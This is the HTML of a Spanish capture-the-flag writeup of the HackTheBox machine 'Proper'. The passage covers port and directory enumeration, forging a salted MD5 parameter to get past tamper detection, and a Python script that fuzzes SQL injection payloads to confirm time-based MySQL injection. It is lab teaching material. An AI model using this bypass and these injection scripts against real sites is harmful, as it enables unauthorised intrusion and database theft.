@@ -1,0 +1,2423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Proper</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Proper | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Proper" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel difícil. Agregamos sal a nuestra inyección SQL, jugaremos a ganar la race condition y finalmente entre reversing, movimiento lateral, creación de scripts en PowerShell y pipes conseguiremos leer archivos del sistema (:" />
+<meta property="og:description" content="Máquina Windows nivel difícil. Agregamos sal a nuestra inyección SQL, jugaremos a ganar la race condition y finalmente entre reversing, movimiento lateral, creación de scripts en PowerShell y pipes conseguiremos leer archivos del sistema (:" />
+<link rel="canonical" href="http://localhost:4000/htb/proper" />
+<meta property="og:url" content="http://localhost:4000/htb/proper" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-21T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321banner.png" />
+<meta property="twitter:title" content="HackTheBox - Proper" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-08-21T00:00:00-07:00","datePublished":"2021-08-21T00:00:00-07:00","description":"Máquina Windows nivel difícil. Agregamos sal a nuestra inyección SQL, jugaremos a ganar la race condition y finalmente entre reversing, movimiento lateral, creación de scripts en PowerShell y pipes conseguiremos leer archivos del sistema (:","headline":"HackTheBox - Proper","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/proper"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/proper"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Proper</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-08-21">21 Aug 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321banner.png" alt="HackTheBox - Proper">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel difícil. Agregamos sal a nuestra inyección <strong>SQL</strong>, jugaremos a ganar la <strong>race condition</strong> y finalmente entre reversing, movimiento lateral, creación de scripts en <strong>PowerShell</strong> y <strong>pipes</strong> conseguiremos leer archivos del sistema (:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321properHTB.png" alt="321properHTB" /></p>
+
+<h2 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h2>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/13569">xct</a> &amp; <a href="https://www.hackthebox.eu/profile/77141">jkr</a>.</p>
+
+<p>Manualidades, manual, manos.</p>
+
+<p>Encontraremos únicamente un servidor web en esta máquina, tendremos que jugar mucho (mucho) y leer mucho (acá también :P), me divertí <strong>bastante</strong> escribiendo este writeup, perdón lo largo (:</p>
+
+<p>Empezaremos jugando con una URL que tiene dos parámetros, en la que encontraremos un <code>SQL injection</code> en uno de ellos… Pero para jugar correctamente con él, debemos usar un <code>salt</code> (que encontramos causando errores en las consultas web) para darle el formato correcto a las peticiones, esto para evitar un errorsito.</p>
+
+<p>Encontraremos credenciales válidas contra un apartado del servidor web llamado <code>/licenses</code>. Jugando con él y unos <code>themes</code> que nos presenta el sitio web, vamos a encontrar un <code>Remote File Inclusion</code>, nos aprovecharemos de esa vuln para mediante un <code>race condition</code> sobreescribir el contenido de un <code>theme</code> por código <code>PHP</code> 🤭. Con esto en mente lograremos una sesión en la máquina como el usuario <code>web</code>.</p>
+
+<p>Estando dentro encontraremos un directorio llamativo (ya que no es nativo del sistema) en la ruta <code>C:\Program Files\Cleaner</code>, que contiene dos binarios, <code>server.exe</code> y <code>client.exe</code>, jugando (muuuuuuuucho) con ellos veremos un proceso que borra y restaura archivos del sistema, lo curioso es que en la mitad del proceso genera una copia del archivo borrado y lo encripta, usaremos ese archivo para seguir jugando y finalmente restaurarlo…</p>
+
+<p>Suena fácil (pensarlo también) pero jmm, varias cositas para jugar… Con esto podremos ver el contenido de cualquier objeto del sistema.</p>
+
+<p>Pero hasta ahora no sé (y a los que he preguntado) como obtener una Shell en la máquina como el usuario <strong>Administrator</strong>, así que por ahora solo podemos leer archivos del sistema.</p>
+
+<p>…</p>
+
+<h3 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Bastaaaaante juego de nuestras manitas y muuuuy realista :)</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Que las luces fluyan.</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Descubrimos puertos abiertos con <strong>nmap</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puerto-80">Investigamos el servidor web sobre el puerto 80</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación: jugamos con los parámetros de la web</a>.
+    <ul>
+      <li><a href="#web-avoid-tampering">Entendiendo como viajan las peticiones para evitar el error al modificar alguna variable</a>.</li>
+      <li><a href="#web-sqli-time">Encontramos <strong>inyección SQL time-based</strong> jugando con la web</a>.</li>
+      <li><a href="#licenses-web-part">Validamos credenciales encontradas con la <strong>inyección SQL</strong> contra un panel login</a>.</li>
+      <li><a href="#web-rfi">Estudiamos posible <strong>Remote File Inclusion</strong> en la web</a>.</li>
+      <li><a href="#testing-securefunc">Confirmando <strong>Remote File Inclusion</strong> en apartado web</a>.</li>
+      <li><a href="#web-racecondition">Intentamos <strong>Race Condition</strong> para sobreescribir archivo con código <strong>PHP</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.
+    <ul>
+      <li><a href="#cleanup-analysis">Hacemos análisis dinámico contra los binarios del proceso <strong>Cleanup</strong></a>.</li>
+      <li><a href="#cleanup-pipe">Interactuamos con el <strong>pipe</strong> que usa el servicio <strong>Cleanup</strong></a>.</li>
+      <li><a href="#cleanup-ioninja">Usando <strong>IO Ninja</strong> para ver procesos del <strong>pipe</strong> (gracias <strong>4st1nus</strong>)</a>.</li>
+      <li><a href="#cleanup-readfiles">Viendo el contenido de cualquier archivo del sistema</a>.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>…</p>
+
+<h1 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h1>
+
+<p>…</p>
+
+<h2 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">📌</a></h2>
+
+<p>Inicialmente haremos un escaneo de puertos para saber que servicios están ejecutándose:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.10.231 -oG initScan 
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535.</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos.</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando.</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash">❭ cat initScan 
+# Nmap 7.80 scan initiated Thu Mar 18 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.231
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.231 ()   Status: Up
+Host: 10.10.10.231 ()   Ports: 80/open/tcp//http/// Ignored State: filtered (65534)
+# Nmap done at Thu Mar 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 225.78 seconds
+</code></pre>
+
+<p>Wow, curiosamente solo tenemos el puerto 80 abierto…</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto">HTTP</a></strong>: Servidor web.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Hagamos el escaneo basado en script y versiones, en este caso en el puerto 80 simplemente:</p>
+
+<pre><code class="language-bash">❭ nmap -p 80 -sC -sV 10.10.10.231 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat portScan 
+# Nmap 7.80 scan initiated Thu Mar 18 25:25:25 2021 as: nmap -p 80 -sC -sV -oN portScan 10.10.10.231
+Nmap scan report for 10.10.10.231
+Host is up (0.12s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: OS Tidy Inc.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Mar 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 15.45 seconds
+</code></pre>
+
+<p>Obtenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Microsoft IIS httpd 10.0</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Empecemos a escarbar el servicio…</p>
+
+<p>…</p>
+
+<h1 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="puerto-80">Puerto 80 <a href="#puerto-80">📌</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321page80.png" alt="321page80" /></p>
+
+<p>Encontramos una bienvenida de varias imágenes y algo de data, pero nada interesante.</p>
+
+<p>Revisando el código fuente, tenemos una referencia a una URL y una petición:</p>
+
+<pre><code class="language-js">...
+&lt;script type="text/javascript"&gt;
+    $(document).ready(function(){
+        'use strict';
+        jQuery('#headerwrap').backstretch([ "assets/img/bg/bg1.jpg", "assets/img/bg/bg3.jpg" ], {duration: 8000, fade: 500});
+        $( "#product-content" ).load("/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b",function() {});
+    });
+&lt;/script&gt;
+...
+</code></pre>
+
+<p>Lo emplea para armar un apartado de la bienvenida: (tiene un aspecto a que podemos jugar con inyecciones, pero primero veamos lo que renderiza con la URL)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321page80_products.png" alt="321page80_products" /></p>
+
+<p>Interceptando la petición con <code>Burp</code> e intentando modificar alguno de los parámetros, tenemos:</p>
+
+<p>(<em>Agregue <code>proper.htb</code> al <code>/etc/hosts</code> para que resuelva contra la IP, por si alguno se pierde al ver el dominio ahí</em>.)</p>
+
+<p><strong>Original:</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321burp_productsPHP_original.png" alt="321burp_productsPHP_original" /></p>
+
+<p><strong>Modificada:</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321burp_productsPHP_modErr.png" alt="321burp_productsPHP_modErr" /></p>
+
+<p>Jmmm, nos detecta que hemos intentado modificar la petición y nos salta una advertencia. Salta siempre el mismo error si intentamos modificar cualquier variable…</p>
+
+<p>Siento que por acá deben ser los tiros pero por el momento no sé que intentar… Hagamos un escaneo de rutas a ver si encontramos algo:</p>
+
+<pre><code class="language-bash">❭ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -u http://10.10.10.231/FUZZ
+...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload      
+=====================================================================
+000000084:   301        1 L      10 W       150 Ch      "assets" 
+000000765:   301        1 L      10 W       150 Ch      "Assets"
+000004182:   301        1 L      10 W       152 Ch      "licenses"
+</code></pre>
+
+<p>Si validamos las rutas en la web, obtenemos info en <code>/licenses</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321page80_licenses.png" alt="321page80_licenses" /></p>
+
+<p>Un panel login, debemos logearnos con una dirección de correo (que podemos intuir que sea <code>usuario@proper.htb</code>). Pero probando cositas no logramos nada…</p>
+
+<p>Haciendo un fuzz sobre <code>/assets</code> encontramos la ruta <code>/api</code>, pero no tenemos acceso a su contenido:</p>
+
+<pre><code class="language-bash">❭ wfuzz --hc=404,500 -L -c -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt http://10.10.10.231/assets/FUZZ
+...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload      
+=====================================================================
+
+000000009:   403        29 L     92 W       1233 Ch     "js"
+000000015:   403        29 L     92 W       1233 Ch     "css"
+000000045:   403        29 L     92 W       1233 Ch     "img"
+000000078:   403        29 L     92 W       1233 Ch     "api"
+</code></pre>
+
+<p>…</p>
+
+<h1 id="explotacion">Explotación <a href="#explotacion">#</a></h1>
+
+<p>Jmmm, tenemos un login panel y un archivo que hace consultas para extraer productos… Podemos pensar que debemos hacer algún tipo de <code>SQ, pero primero debemos bypassear el </code>WAF (Firewall Web)<code> que nos detecta si cambiamos la consulta, después de un rato jugando con </code>BurpSuite` vemos un error interesante al quitar uno de los parámetros:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321burp_products_without_h_parm.png" alt="321burp_products_without_h_parm" /></p>
+
+<ul>
+  <li>Vemos la ruta donde están servidos los archivos del sitio: <code>C:\inetpub\wwwroot\</code>.</li>
+  <li>Tenemos un <code>salt</code> (<strong>conjunto de bits aleatorios que se le agregan a un hash, sea al principio o al final</strong>, no lo sabemos) <a href="https://thalskarthmaelstrom.wordpress.com/2014/03/15/hash-salt-y-hashes-lentos/"><strong>INFO Salt</strong></a>.</li>
+  <li>Vemos dos archivos que pueden ser interesantes en algún caso, por si encontramos algún <strong>LFI</strong> ya sabemos como se llama el archivo de configuración de la base de datos…</li>
+</ul>
+
+<p>Después de muchas pruebas ):) y estar super perdido, jugamos con el <strong>salt</strong> y un fuzzeito guapetón de payloads, pero antes de jugar, veamos el formato necesario para evitar el error <strong>“Forbidden - Tampering attempt detected”</strong> al modificar las variables:</p>
+
+<hr />
+
+<h2 id="web-avoid-tampering">Evitando error <u>Tampering attempt detected</u> <a href="#web-avoid-tampering">📌</a></h2>
+
+<p>Esta es la petición original:</p>
+
+<pre><code class="language-html">http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b
+</code></pre>
+
+<p>Vamos a entender como esta generándose el hash y revisamos como viaja la data.</p>
+
+<ul>
+  <li><a href="https://nitratine.net/blog/post/how-to-hash-passwords-in-python/">How to hash passwords in Python</a>.</li>
+  <li><a href="https://www.vitoshacademy.com/hashing-passwords-in-python/">Hashing passwords in Python</a>.</li>
+</ul>
+
+<hr />
+
+<pre><code class="language-bash">❭ python3 
+&gt;&gt;&gt; import requests
+&gt;&gt;&gt; import hashlib
+&gt;&gt;&gt; 
+&gt;&gt;&gt; url = "http://proper.htb/products-ajax.php"
+&gt;&gt;&gt; salt = "hie0shah6ooNoim"
+# En la consulta sale con un "+", pero es debido al URL encode que se hace en la peticion (el + es un espacio ahí)
+&gt;&gt;&gt; payload = "id desc" 
+</code></pre>
+
+<p>Bien, tenemos las variables necesarias para empezar a jugar, el valor de <code>h</code> podemos intuir que es el resultado del payload pero obteniendo su hash en <code>md5</code>:</p>
+
+<pre><code class="language-py">&gt;&gt;&gt; hashh = hashlib.md5(payload.encode('utf-8')).hexdigest()
+&gt;&gt;&gt; print("Payload: " + payload + " --&gt; " + "Hash: " + hashh)
+Payload: id desc --&gt; Hash: aa5a97b10a6dd87160868d2316ab2425
+</code></pre>
+
+<p>Listo, obtenemos el hash <strong>md5</strong> de la cadena <code>id desc</code>, pero no es el mismo que el de la consulta original, por lo tanto si hacemos una validación ante la web, vemos el error:</p>
+
+<pre><code class="language-bash">&gt;&gt;&gt; session = requests.Session()
+&gt;&gt;&gt; r = session.get(url, params={"order":payload, "h":hashh})
+&gt;&gt;&gt; print(r.text)
+Forbidden - Tampering attempt detected.
+</code></pre>
+
+<p>Acá entra en juego la variable <code>salt</code>, movámosla por todos lados a ver en que momento (si es que llega ese momento) nos deja de mostrar el error en la respuesta:</p>
+
+<p>🕴️ Después de un rato…</p>
+
+<pre><code class="language-bash">&gt;&gt;&gt; hashh = hashlib.md5(payload.encode('utf-8') + salt.encode('utf-8')).hexdigest()
+&gt;&gt;&gt; print("Payload + Salt: " + payload + " + " + salt + " --&gt; " + "Hash: " + hashh)
+Payload + Salt: id desc + hie0shah6ooNoim --&gt; Hash: 453d803378d6fb7eaf6a3cab618106d6
+&gt;&gt;&gt; r = session.get(url, params={"order":payload, "h":hashh})
+&gt;&gt;&gt; print(r.text)
+Forbidden - Tampering attempt detected.
+</code></pre>
+
+<pre><code class="language-bash">&gt;&gt;&gt; hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()
+&gt;&gt;&gt; print("Salt + Payload: " + salt + " + " + payload + " --&gt; " + "Hash: " + hashh)
+Salt + Payload: hie0shah6ooNoim + id desc --&gt; Hash: a1b30d31d344a5a4e41e8496ccbdd26b
+&gt;&gt;&gt; r = session.get(url, params={"order":payload, "h":hashh})
+&gt;&gt;&gt; print(r.text)
+&lt;div class="row"&gt;&lt;div class="col-md-4"&gt;
+...
+</code></pre>
+
+<p>OJOOOOOOOOOOOOOo, <strong>en el hash vemos el mismo valor que en la consulta original</strong> y al ver la respuesta de la petición tenemos la cabecera <code>HTML</code> de la web (: Así que ya sabemos como se genera el hash y como viaja la data para no obtener el errooooooooooooooooooooor 🌻</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321google_gif_yeahminion.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;" /></p>
+
+<h2 id="web-sqli-time">Encontramos <u>SQLi time-based</u> en la web <a href="#web-sqli-time">📌</a></h2>
+
+<p>Creemos el script para leer de un archivo llamado <code>sqlIgeneric.txt</code> algunos payloads (de <a href="https://github.com/payloadbox/sql-injection-payload-list">esta lista</a>), enviarlos a la web y ver que pasa :P</p>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import requests, hashlib
+import signal
+from pwn import *
+
+# Ctrl + C
+def def_handler(sig, frame):
+    print("\nInterrupción, saliendo...\n")
+    exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables
+url = "http://proper.htb/products-ajax.php"
+salt = "hie0shah6ooNoim"
+file_sqli = open('./sqlIgeneric.txt', 'r')
+sqli_payloads = []
+
+p1 = log.progress("paYl0Ad")
+
+for pos, line_sqli in enumerate(file_sqli): # Recorremos el archivo
+    payload = line_sqli.strip()
+    hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()
+
+    p1.status(payload)
+    data_get = {"order":payload, "h":hashh}
+
+    # Si se demora 3 segundos respondiendonos potencialmente existe una inyección sql basada en tiempo.
+    try:
+        r = requests.get(url, params=data_get, timeout=3)
+
+        # O si no hay error en la web tambien puede ser interesante.
+        if r.status_code != 500: 
+            sqli_payloads.append(payload)
+
+    except requests.exceptions.Timeout:
+        sqli_payloads.append(payload)
+
+p1.success("FINAAAAAAAAAAAAAAAAAL.")
+
+if sqli_payloads:
+    print("[+] Estos payloads generaron algo distinto en la respuesta de la web.")
+    total_payloads = '\n'.join(sqli_payloads) # Tomamos cada valor del array y lo imprimimos en una nueva linea.
+    print(total_payloads)
+else:
+    print("[-] Nada aún...")
+
+file_sqli.close()
+</code></pre>
+
+<p>Validamos si la página nos devuelve un código distinto a <strong>Internal Error</strong> (500) y si algún payload (de los que están basados en tiempo) hace que la petición se demore.</p>
+
+<p>El diccionario es una colección de varios repos, logramos extraer más de 2000 payloads (líneas):</p>
+
+<ul>
+  <li><a href="https://github.com/payloadbox/sql-injection-payload-list">https://github.com/payloadbox/sql-injection-payload-list</a>.</li>
+  <li><a href="https://github.com/OWASP/AppSec-Browser-Bundle/tree/master/utilities/wfuzz/wordlist/fuzzdb/attack-payloads/sql-injection/payloads-sql-blind">https://github.com/OWASP/payloads-sql-blind</a>.</li>
+</ul>
+
+<p>Ejecutándolo vemos esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_fuzzSQLi_payloadsFound.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>OPAAA, hay varios payloads que en su interacción generaron algo distinto a lo normal. PEEEEEEEEEEEERO ¿qué es lo llamativo? ¿lo sabes ya? EXACTOOOOOOO!! Todas tienen que ver con una inyección <strong>SQL</strong> basada en tiempooooooooooooooo.</p>
+
+<p>🧿 <strong><em>Una inyección SQL basada en tiempo básicamente es ejecutar alguna sentencia que al dar resultado (exitoso) genera un -delay- en el lado del servidor. Si ese -delay- existe (causado por nosotros) sabemos que existe un <code>SQLi time-based</code>.</em></strong></p>
+
+<p>Para confirmar que tenemos ese tipo de inyección podemos hacer esto:</p>
+
+<pre><code class="language-py">...
+for i in range(1,11):
+    payload = f"IF(6={i},sleep(5),0)#"
+    hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()
+
+    data_get = {"order":payload, "h":hashh}
+
+    try:
+        r = requests.get(url, params=data_get, timeout=3)
+        print("Nada: " + payload)
+    except requests.exceptions.Timeout:
+        print("-------&gt; Acá: " + payload)
+</code></pre>
+
+<p>Le pasamos el payload <code>IF(6=N,sleep(5),0)#</code> (este es válido en <code>MySQL</code>, en caso de no servir deberíamos probar lo mismo pero con la sintaxis de los otros gestores de DBs) que le indica:</p>
+
+<ul>
+  <li>Si <code>N</code> numero es igual a <code>6</code>, haz que la web <strong><em>se demore 5 segundos en responder</em></strong>, de lo contrario sigue… Si existe el delay en la respuesta, confirmamos la inyección.</li>
+</ul>
+
+<p>Y si lo probamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_confirmSQli_TIMEBASED.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>LIIIIIIIIIIIISTOOOOOOOOONES, tenemos <code>SQLi time-based</code> (y sabemos que estamos ante un <code>MySQL</code>).</p>
+
+<p>Pues explotémoslo y veamos toooooooooda la info de las bases de datos (:</p>
+
+<p>…</p>
+
+<h3 id="web-sqli-dbs">Extraemos las bases de datos existentes <a href="#web-sqli-dbs">🪓</a></h3>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/sqli/dbs.py">dbs.py</a></p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_dbs.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ejecutándolo vemos solo 3 bases de datos y dos llamativas, <code>cleaner</code> y <code>test</code>, veamos las tablas de <code>cleaner</code>…</p>
+
+<h3 id="web-sqli-tables">Extraemos las tablas de la base de datos <u>cleaner</u> <a href="#web-sqli-tables">🪓</a></h3>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/sqli/tables.py">tables.py</a></p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_tables_cleaner.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, también hay varias tablas, veamos la de los clientes primero…</p>
+
+<h3 id="web-sqli-columns">Extraemos las columnas de la tabla <u>customers</u> <a href="#web-sqli-columns">🪓</a></h3>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/sqli/columns.py">columns.py</a></p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_columns_cleanerYcustomers.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ahora intentemos dumpear los campos principales, el <code>id</code>, el usuario (<code>login</code>) y su <code>password</code>.</p>
+
+<h3 id="web-sqli-info">Extraemos información de las columnas <a href="#web-sqli-info">🪓</a></h3>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/sqli/info.py">info.py</a></p>
